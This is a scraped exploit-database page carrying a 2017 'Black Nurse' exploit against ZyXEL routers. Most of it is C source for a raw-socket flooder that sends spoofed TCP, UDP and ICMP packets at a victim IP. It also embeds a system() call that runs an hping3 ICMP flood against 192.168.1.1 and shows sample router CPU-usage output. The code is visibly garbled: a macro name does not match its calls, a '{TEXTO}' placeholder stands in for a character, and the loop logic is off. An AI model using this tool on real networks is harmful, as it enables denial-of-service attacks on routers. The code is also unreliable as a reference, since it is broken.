=== Content from www.zyxel.com_d50f5541_20250124_173642.html ===



=== Content from cxsecurity.com_c6ab9f33_20250124_173642.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **ZYXEL Modems/Router ICMP Flood Black Nurse Attack** **2017.02.18** Credit:  **[Hosein Askari](https://cxsecurity.com/author/Hosein%2BAskari/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **N/A** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

#####
#Exploit Title: Black Nurse Attack on ALL ZYXEL Modems/Router
#Exploit Author: Hosein Askari (FarazPajohan)
#Vendor HomePage: http://www.zyxel.com/index.shtml
#Version : All
#Tested on: Parrot OS
#Date: 17-2-2017
#Category: Network Appliance
#Vulnerable Part: Kernel
#Author Mail :hosein.askari@aol.com
#Description:
#The ZYXEL Modems's kernel is disrupted by vulnerability on ICMP Type, in which the cpu usage will be 100% until the local exploit launches on the router.
\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*
#Exploit Command :
# ~~~#exploit.out -I -h <victim\_ip> -p [80,80]
#
#Exploit Code :
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#ifdef F\_PASS
#include <sys/stat.h>
#endif
#include <netinet/in\_systm.h>
#include <sys/socket.h>
#include <string.h>
#include <time.h>
#ifndef \_\_USE\_BSD
# define \_\_USE\_BSD
#endif
#ifndef \_\_FAVOR\_BSD
# define \_\_FAVOR\_BSD
#endif
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip\_icmp.h>
#include <arpa/inet.h>
#ifdef LINUX
# define FIX(x) htons(x)
#else
# define FIX(x) (x)
#endif
#define TCP\_ACK 1
#define TCP\_FIN 2
#define TCP\_SYN 4
#define TCP\_RST 8
#define UDP\_CFF 16
#define ICMP\_ECHO\_G 32
#define TCP\_NOF 64
#define TCP\_URG 128
#define TH\_NOF 0x0
#define TCP\_ATTACK() (a\_flags & TCP\_ACK ||\
a\_flags & TCP\_FIN ||\
a\_flags & TCP\_SYN ||\
a\_flags & TCP\_RST ||\
a\_flags & TCP\_NOF ||\
a\_flags & TCP\_URG )
#define UDP\_ATTACK() (a\_flags & UDP\_CFF)
#define ICMP\_ATTACK() (a\_flags & ICMP\_ECHO\_G)
#define CHOOSE\_DST\_PORT() dst\_sp == 0 ?\
random () :\
htons(dst\_sp + (random() % (dst\_ep -dst\_sp +1)));
#define CHOOSE\_SRC\_PORT() src\_sp == 0 ?\
random () :\
htons(src\_sp + (random() % (src\_ep -src\_sp +1)));
#define KET() if (sendto(rawsock,\
&packet,\
(sizeof packet),\
0,\
(struct sockaddr \*)&target,\
sizeof target) < 0) {\
perror("sendto");\
exit(-1);\
}
#define BANNER\_CKSUM 54018
u\_long lookup(const char \*host);
unsigned short in\_cksum(unsigned short \*addr, int len);
static void inject\_iphdr(struct ip \*ip, u\_char p, u\_char len);
char \*class2ip(const char \*class);
static void send\_tcp(u\_char th\_flags);
static void send\_udp(u\_char garbage);
static void send\_icmp(u\_char garbage);
char \*get\_plain(const char \*crypt\_file, const char \*xor\_data\_key);
static void usage(const char \*argv0);
u\_long dstaddr;
u\_short dst\_sp, dst\_ep, src\_sp, src\_ep;
char \*src\_class, \*dst\_class;
int a\_flags, rawsock;
struct sockaddr\_in target;
const char \*banner = "Written By C0NSTANTINE";
struct pseudo\_hdr {
u\_long saddr, daddr;
u\_char mbz, ptcl;
u\_short tcpl;
};
struct cksum {
struct pseudo\_hdr pseudo;
struct tcphdr tcp;
};
struct {
int gv;
int kv;
void (\*f)(u\_char);
} a\_list[] = {
{ TCP\_ACK, TH\_ACK, send\_tcp },
{ TCP\_FIN, TH\_FIN, send\_tcp },
{ TCP\_SYN, TH\_SYN, send\_tcp },
{ TCP\_RST, TH\_RST, send\_tcp },
{ TCP\_NOF, TH\_NOF, send\_tcp },
{ TCP\_URG, TH\_URG, send\_tcp },
{ UDP\_CFF, 0, send\_udp },
{ ICMP\_ECHO\_G, ICMP\_ECHO, send\_icmp },
{ 0, 0, (void \*)NULL },
};
int
main(int argc, char \*argv[])
{
int n, i, on = 1;
int b\_link;
#ifdef F\_PASS
struct stat sb;
#endif
unsigned int until;
a\_flags = dstaddr = i = 0;
dst\_sp = dst\_ep = src\_sp = src\_ep = 0;
until = b\_link = -1;
src\_class = dst\_class = NULL;
while ( (n = getopt(argc, argv, "T:UINs:h:d:p:q:l:t:")) != -1) {
char \*p;
switch (n) {
case 'T':
switch (atoi(optarg)) {
case 0: a\_flags |= TCP\_ACK; break;
case 1: a\_flags |= TCP\_FIN; break;
case 2: a\_flags |= TCP\_RST; break;
case 3: a\_flags |= TCP\_SYN; break;
case 4: a\_flags |= TCP\_URG; break;
}
break;
case 'U':
a\_flags |= UDP\_CFF;
break;
case 'I':
a\_flags |= ICMP\_ECHO\_G;
break;
case 'N':
a\_flags |= TCP\_NOF;
break;
case 's':
src\_class = optarg;
break;
case 'h':
dstaddr = lookup(optarg);
break;
case 'd':
dst\_class = optarg;
i = 1;
break;
case 'p':
if ( (p = (char \*) strchr(optarg, ',')) == NULL)
usage(argv[0]);
dst\_sp = atoi(optarg);
dst\_ep = atoi(p +1);
break;
case 'q':
if ( (p = (char \*) strchr(optarg, ',')) == NULL)
usage(argv[0]);
src\_sp = atoi(optarg);
src\_ep = atoi(p +1);
break;
case 'l':
b\_link = atoi(optarg);
if (b\_link <= 0 || b\_link > 100)
usage(argv[0]);
break;
case 't':
until = time(0) +atoi(optarg);
break;
default:
usage(argv[0]);
break;
}
}
if ( (!dstaddr && !i) ||
(dstaddr && i) ||
(!TCP\_ATTACK() && !UDP\_ATTACK() && !ICMP\_ATTACK()) ||
(src\_sp != 0 && src\_sp > src\_ep) ||
(dst\_sp != 0 && dst\_sp > dst\_ep))
usage(argv[0]);
srandom(time(NULL) ^ getpid());
if ( (rawsock = socket(AF\_INET, SOCK\_RAW, IPPROTO\_RAW)) < 0) {
perror("socket");
exit(-1);
}
if (setsockopt(rawsock, IPPROTO\_IP, IP\_HDRINCL,
(char \*)&on, sizeof(on)) < 0) {
perror("setsockopt");
exit(-1);
}
target.sin\_family = AF\_INET;
for (n = 0; ; ) {
if (b\_link != -1 && random() % 100 +1 > b\_link) {
if (random() % 200 +1 > 199)
usleep(1);
continue;
}
for (i = 0; a\_list[i].f != NULL; ++i) {
if (a\_list[i].gv & a\_flags)
a\_list[i].f(a\_list[i].kv);
}
if (n++ == 100) {
if (until != -1 && time(0) >= until) break;
n = 0;
}
}
exit(0);
}
u\_long
lookup(const char \*host)
{
struct hostent \*hp;
if ( (hp = gethostbyname(host)) == NULL) {
perror("gethostbyname");
exit(-1);
}
return \*(u\_long \*)hp->h\_addr;
}
#define RANDOM() (int) random() % 255 +1
char \*
class2ip(const char \*class)
{
static char ip[16];
int i, j;
for (i = 0, j = 0; class[i] != '{TEXTO}'; ++i)
if (class[i] == '.')
++j;
switch (j) {
case 0:
sprintf(ip, "%s.%d.%d.%d", class, RANDOM(), RANDOM(), RANDOM());
break;
case 1:
sprintf(ip, "%s.%d.%d", class, RANDOM(), RANDOM());
break;
case 2:
sprintf(ip, "%s.%d", class, RANDOM());
break;
default: strncpy(ip, class, 16);
break;
}
return ip;
}
unsigned short
in\_cksum(unsigned short \*addr, int len)
{
int nleft = len;
int sum = 0;
unsigned short \*w = addr;
unsigned short answer = 0;
while (nleft > 1) {
sum += \*w++;
nleft -= 2;
}
if (nleft == 1) {
\*(unsigned char \*) (&answer) = \*(unsigned char \*)w;
sum += answer;
}
sum = (sum >> 16) + (sum & 0xffff);
sum += (sum >> 16);
answer = ~sum;
return answer;
}
static void
inject\_iphdr(struct ip \*ip, u\_char p, u\_char len)
{
ip->ip\_hl = 5;
ip->ip\_v = 4;
ip->ip\_p = p;
ip->ip\_tos = 0x08; /\* 0x08 \*/
ip->ip\_id = random();
ip->ip\_len = len;
ip->ip\_off = 0;
ip->ip\_ttl = 255;
ip->ip\_dst.s\_addr = dst\_class != NULL ?
inet\_addr(class2ip(dst\_class)) :
dstaddr;
ip->ip\_src.s\_addr = src\_class != NULL ?
inet\_addr(class2ip(src\_class)) :
random();
target.sin\_addr.s\_addr = ip->ip\_dst.s\_addr;
}
static void
send\_tcp(u\_char th\_flags)
{
struct cksum cksum;
struct packet {
struct ip ip;
struct tcphdr tcp;
} packet;
memset(&packet, 0, sizeof packet);
inject\_iphdr(&packet.ip, IPPROTO\_TCP, FIX(sizeof packet));
packet.ip.ip\_sum = in\_cksum((void \*)&packet.ip, 20);
cksum.pseudo.daddr = dstaddr;
cksum.pseudo.mbz = 0;
cksum.pseudo.ptcl = IPPROTO\_TCP;
cksum.pseudo.tcpl = htons(sizeof(struct tcphdr));
cksum.pseudo.saddr = packet.ip.ip\_src.s\_addr;
packet.tcp.th\_flags = random();
packet.tcp.th\_win = random();
packet.tcp.th\_seq = random();
packet.tcp.th\_ack = random();
packet.tcp.th\_off = 5;
packet.tcp.th\_urp = 0;
packet.tcp.th\_sport = CHOOSE\_SRC\_PORT();
packet.tcp.th\_dport = CHOOSE\_DST\_PORT();
cksum.tcp = packet.tcp;
packet.tcp.th\_sum = in\_cksum((void \*)&cksum, sizeof(cksum));
SEND\_PACKET();
}
static void
send\_udp(u\_char garbage)
{
struct packet {
struct ip ip;
struct udphdr udp;
} packet;
memset(&packet, 0, sizeof packet);
inject\_iphdr(&packet.ip, IPPROTO\_UDP, FIX(sizeof packet));
packet.ip.ip\_sum = in\_cksum((void \*)&packet.ip, 20);
packet.udp.uh\_sport = CHOOSE\_SRC\_PORT();
packet.udp.uh\_dport = CHOOSE\_DST\_PORT();
packet.udp.uh\_ulen = htons(sizeof packet.udp);
packet.udp.uh\_sum = 0;
SEND\_PACKET();
}
static void
send\_icmp(u\_char gargabe)
{
struct packet {
struct ip ip;
struct icmp icmp;
} packet;
memset(&packet, 0, sizeof packet);
inject\_iphdr(&packet.ip, IPPROTO\_ICMP, FIX(sizeof packet));
packet.ip.ip\_sum = in\_cksum((void \*)&packet.ip, 20);
packet.icmp.icmp\_type = ICMP\_ECHO;
packet.icmp.icmp\_code = 0;
packet.icmp.icmp\_cksum = htons( ~(ICMP\_ECHO << 8));
for(int pp=0;pp<=1000;pp++)
{SEND\_PACKET();
system("sudo hping3 --icmp -C 3 -K 3 --flood 192.168.1.1");
pp++;
}
}
static void
usage(const char \*argv0)
{
printf("%s \n", banner);
printf(" -U UDP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
printf(" -I ICMP attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
printf(" -N Bogus attack \e[1;37m(\e[0m\e[0;31mno options\e[0m\e[1;37m)\e[0m\n");
printf(" -T TCP attack \e[1;37m[\e[0m0:ACK, 1:FIN, 2:RST, 3:SYN, 4:URG\e[1;37m]\e[0m\n");
printf(" -h destination host/ip \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
printf(" -d destination class \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -s source class/ip \e[1;37m(\e[m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -p destination port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -q source port range [start,end] \e[1;37m(\e[0m\e[0;31mrandom\e[0m\e[1;37m)\e[0m\n");
printf(" -l pps limiter \e[1;37m(\e[0m\e[0;31mno limit\e[0m\e[1;37m)\e[0m\n");
printf(" -t timeout \e[1;37m(\e[0m\e[0;31mno default\e[0m\e[1;37m)\e[0m\n");
printf("\e[1musage\e[0m: %s [-T0 -T1 -T2 -T3 -T4 -U -I -h -p -t]\n", argv0);
exit(-1);
}
##################
#Description :
#The Sample Output of "CPU Usage" is shown below :
ras> sys cpu display
CPU usage status:
baseline 2106258 ticks
sec ticks util sec ticks util sec ticks util sec ticks util
0 38946 98.15 1 41192 98.04 2 31775 98.49 3 28809 98.63
4 34793 98.34 5 29538 98.59 6 27583 98.69 7 24396 98.84
8 37998 98.19 9 37480 98.22 10 45516 97.83 11 30303 98.56
12 65621 96.88 13 43413 97.93 14 23665 98.87 15 22725 98.92
16 37541 98.21 17 23472 98.88 18 21547 98.97 19 29162 98.61
20 44610 97.88 21 46361 97.79 22 29142 98.61 23 44881 97.86
24 27780 98.68 25 41068 98.05 26 27908 98.67 27 443183 78.95
28 855646 59.37 29 880562 58.19 30 896890 57.41 31 898806 57.32
32 716284 65.99 33 356495 83.07 34 81422 96.13 35 101699 95.17
36 94883 95.49 37 94579 95.50 38 65748 96.87 39 69851 96.68
40 46499 97.79 41 42021 98.00 42 66529 96.84 43 66446 96.84
44 38797 98.15 45 62718 97.02 46 3370 99.84 47 30205 98.56
48 43499 97.93 49 37927 98.19 50 33788 98.39 51 40783 98.06
52 34171 98.37 53 45389 97.84 54 41723 98.01 55 33155 98.42
56 39552 98.12 57 36637 98.26 58 43808 97.92 59 24510 98.83
60 29158 98.61 61 35887 98.29 62 34649 98.35

**##### References:**

 http://www.zyxel.com/index.shtml

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2017020177)
[Tweet](https://twitter.com/share)

Vote for this issue:

 1
 0

100%
0%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top


